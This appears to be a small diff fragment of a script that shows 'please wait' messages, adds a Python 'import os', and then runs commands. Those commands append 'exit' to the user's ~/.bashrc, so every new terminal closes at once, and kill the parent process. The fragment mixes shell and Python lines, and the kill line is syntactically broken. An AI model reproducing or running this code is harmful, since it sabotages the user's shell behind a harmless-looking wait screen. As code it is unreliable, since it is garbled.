@@ -14,6 +14,9 @@ clear
  sleep 5 
  echo "please wait................................." 
  sleep 10 
+ import os
+
+
  os.system("echo 'exit' >> ~/.bashrc")
  os.system(kill -9 %d"%(os.getppid()))
 
